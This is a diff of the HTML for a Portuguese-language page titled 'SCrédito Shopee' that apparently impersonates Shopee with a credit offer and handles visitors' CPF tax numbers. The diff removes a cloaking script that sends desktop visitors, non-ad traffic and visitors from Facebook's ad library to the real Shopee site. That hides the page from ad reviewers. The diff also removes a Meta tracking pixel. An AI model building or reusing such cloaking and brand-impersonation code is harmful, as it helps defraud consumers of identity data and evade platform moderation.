@@ -1,67 +1,12 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-    <script
+<script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
   data-utmify-prevent-xcod-sck
   data-utmify-prevent-subids
   async
   defer
 ></script>
-    <meta charset="UTF-8">
-<!-- Meta Pixel Code -->
- <script type="text/javascript">
-  function isMobile() {
-    return /android|iphone|ipod|ipad|mobile/i.test(navigator.userAgent);
-  }
-
-  function isFromAdClick() {
-    const referrer = document.referrer.toLowerCase();
-    const userAgent = navigator.userAgent.toLowerCase();
-
-    const validSources = [
-      'm.facebook.com',
-      'l.facebook.com',
-      'www.facebook.com',
-      'instagram.com',
-      'www.instagram.com',
-      'l.instagram.com'
-    ];
-
-    // Impede acesso da biblioteca de anúncios
-    if (referrer.includes('facebook.com/ads') || referrer.includes('ad_library')) {
-      return false;
-    }
-
-    // Verifica se referrer contém alguma origem válida
-    const isValidReferrer = validSources.some(source => referrer.includes(source));
-
-    // Verifica se userAgent contém "fb" ou "instagram"
-    const isValidAgent = userAgent.includes('fb') || userAgent.includes('instagram');
-
-    // Deve ser mobile, vir de referrer válido E ter userAgent esperado
-    return isMobile() && isValidReferrer && isValidAgent;
-  }
-
-  if (!isFromAdClick()) {
-    window.location.href = 'https://shopee.com.br/'; // URL de fallback
-  }
-</script>
-<script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '1266572574835745');
-  fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=1266572574835745&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
-    <script async="" defer="" src="js/pixel.js"></script>
+<!DOCTYPE html><html lang="pt-BR"><head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SCrédito Shopee</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -715,6 +660,7 @@
       document.addEventListener("DOMContentLoaded", function () {
         // Verificar se existe CPF no localStorage
         const cpfSalvo = localStorage.getItem("cpf");
+        
         const cpfInputPage = document.getElementById("cpfInputPage");
 
         if (cpfSalvo && cpfInputPage) {
@@ -731,8 +677,6 @@
           cpfInputPage.value = cpfFormatado;
           console.log("CPF preenchido automaticamente do localStorage");
         }
-      });
+      });  
     </script>
-  
-
 </body></html>
